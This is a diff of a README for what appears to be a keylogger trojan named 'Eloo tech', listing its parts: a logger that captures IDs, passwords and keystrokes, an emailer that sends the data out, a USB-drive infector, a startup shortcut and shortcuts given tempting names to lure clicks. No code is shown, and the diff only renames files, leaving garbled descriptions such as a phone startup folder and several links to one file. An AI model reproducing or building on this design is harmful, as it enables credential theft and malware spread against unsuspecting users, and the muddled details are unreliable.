@@ -7,12 +7,12 @@ You are looking at a **Eloo tech** that steals data (ID, password; every key str
 *Created only for learning purpose.*
 
 ### Intro
-- [Elootech.cpp](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech.cpp)- logs user's data, sends data through Transmit.exe, infects portable drive.
-- [Infect.cpp](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech.cpp)- installs the virus into computer from portable drive.
-- [Transmit.exe](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech.cpp)-  emails data back.
-- [TrojanCockroach.lnk](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech.cpp)- resides in the startup folder of phone and activates Elootech.exe.
-- [Infect.lnk](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
-- [DecodeMessage.cpp](https://github.com/Elootech/hack/blob/master/com/minhaskamal/Elootech/elootech/DecodeMessage.cpp)- used to decode received email.
+- [Elootech.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- logs user's data, sends data through Elootech.exe, infects portable drive.
+- [elootech.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- installs the pc by Eloo Tech into computer from portable drive.
+- [Elootech.exe](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)-  emails data back.
+- [elootech.lnk](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.cpp)- resides in the startup folder of phone and activates Elootech.exe.
+- [Elootech.lnk](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
+- [DecodeMessage.cpp](https://github.com/Elootech/hack/blob/master/com/Hack/Elootech/elootech/DecodeMessage.cpp)- used to decode received email.
 
 ### Setup
 
